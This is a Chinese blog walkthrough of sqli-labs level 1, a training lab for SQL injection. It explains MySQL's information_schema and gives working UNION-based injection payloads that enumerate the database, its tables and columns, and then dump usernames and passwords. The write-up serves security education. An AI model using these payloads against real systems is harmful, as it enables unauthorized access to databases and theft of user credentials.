sqli-labs(一)

发表于 2023-10-14

mysql数据库相关知识

  1. information_schema：表示所有信息，包括库、表、列
  2. information_schema.tables：记录所有表名信息的表
  3. information_schema.columns：记录所有列名信息的表
  4. table_schema：数据库的名称
  5. table_name:表名
  6. column_name:列名
  7. group_concat():显示所有查询到的数据

mysql数据库5.0以上版本有一个自带的数据库叫做information_schema,该数据库下面有两个表一个是tables和columns。tables这个表的table_name字段下面是所有数据库存在的表名。table_schema字段下是所有表名对应的数据库名。columns这个表的colum_name字段下是所有数据库存在的字段名。columns_schema字段下是所有表名对应的数据库。

注：如果字段本身是int类型，并且在查询语句中该字段的值被双引号或者单引号包裹，则只要值是以正确数字开头的，后面接多余的字符还是可以返回正确的查询结果，甚至单引号中可以包含双引号，双引号中可以包含单引号。

sqli-labs第一关

首先先判断该注入是数字型还是字符型

我们输入?id=1

当我们输入不同数字时，界面显示的结果也不一样，说明我们输入的参数被带入到了数据库中进行查询

当我们输入?id=1’时

会提示我们说SQL语句存在错误

而使用–+注释掉后，界面恢复了正常。这说明原始SQL语句大致格式为select a from b where c=’ ‘;

为单引号闭合。

接下来我们要尝试爆出一下数据库的相关信息

我们可以构造?id=1’ order by 4 –+ ,这个语句被带入到原始SQL语句后，执行效果为：按照表中第4列进行排序

而通过界面回显，我们知道该表中只有3列，我们可以通过输入?id=1’ order by 3 –+来验证。

接下来我们要爆出显示位，就是判断表里哪些列的数据会在界面上显示。

输入?id=-1’union select 1,2,3–+（注：这里-1是为了关闭原始查询，从而执行后面的查询语句）

可以知晓第2，3列的数据是会显示在界面上的

知道这有什么用呢？我们可以查询数据库的版本和当前数据库名，让它们显示在界面上。

输入：?id=-1'union select 1,database(),version()--+

知道数据库名后，我们可以查询该数据库下所有的表名

输入：?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+

很显然，用户的敏感信息保存在users表中，我们下一步就是要查询users表中的字段名

输入：?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+

最后就是愉快的爆出username和password等信息了

输入：?id=-1'union select 1,2,group_concat(username,password) from users --+
